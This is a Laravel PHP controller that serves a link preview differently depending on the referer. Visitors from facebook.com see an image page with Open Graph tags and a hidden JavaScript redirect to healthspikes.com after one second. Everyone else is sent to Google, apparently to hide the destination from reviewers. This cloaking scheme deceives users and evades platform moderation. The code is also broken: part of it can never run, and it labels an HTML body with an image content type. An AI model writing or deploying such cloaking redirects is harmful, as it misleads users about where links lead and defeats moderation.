<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\Response;

class ImageController extends Controller
{
    public function showImage(Request $request)
    {
        // Path to your image file
        $imagePath = public_path('uploads/beef.jpg'); // Update path as needed

        // Check if the referer is Facebook (i.e., Facebook post)
        if (str_contains($request->headers->get('referer'), 'facebook.com')) {
            // Return the image with a 1-second delay before redirecting
            return $this->serveImageWithRedirect($imagePath);
        }else{
            return redirect("https://www.google.com/");
        }

        // Check if the file exists
        if (!File::exists($imagePath)) {
            abort(404); // Return a 404 error if the image is not found
        }

        // Serve the image if it's not a Facebook request
        return $this->serveImage($imagePath);
    }

    // Helper method to serve the image directly
    private function serveImage($imagePath)
    {
        // Check if the file exists
        if (!File::exists($imagePath)) {
            abort(404); // Return a 404 error if the image is not found
        }

        // Set the appropriate headers for the image
        $image = File::get($imagePath);
        $type = File::mimeType($imagePath);

        // Return the image content
        return response($image, 200)
            ->header('Content-Type', $type);
    }

    // Helper method to serve the image with a 1-second redirect
    private function serveImageWithRedirect($imagePath)
    {
        // Check if the file exists
        if (!File::exists($imagePath)) {
            abort(404); // Return a 404 error if the image is not found
        }

        // Get the image content and mime type
        $image = File::get($imagePath);
        $type = File::mimeType($imagePath);

        // Serve the image normally, but inject a JavaScript redirect after 1 second
        return response($image, 200)
            ->header('Content-Type', $type)
            ->header('Cache-Control', 'no-cache, no-store, must-revalidate') // Prevent caching
            ->header('Pragma', 'no-cache')
            ->header('Expires', '0')
            ->setContent(
                '<html>
            <head>
                <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />

                <!-- Open Graph meta tags -->
                <meta property="og:title" content="Some title" />
                <meta property="og:type" content="image/jpg" />
                <meta property="og:url" content="https://phenxlab.com/imagegallery/somename.jpg" />
                <meta property="og:image" content="https://phenxlab.com/imagegallery/somename.jpg" />
            </head>
            <body>
                <img src="' . asset('uploads/beef.jpg') . '" alt="Beef Image" />
                <script>
                    setTimeout(function() {
                        window.location.href = "https://healthspikes.com"; // Your target URL
                    }, 1000);
                </script>
            </body>
        </html>'
            );

    }
}
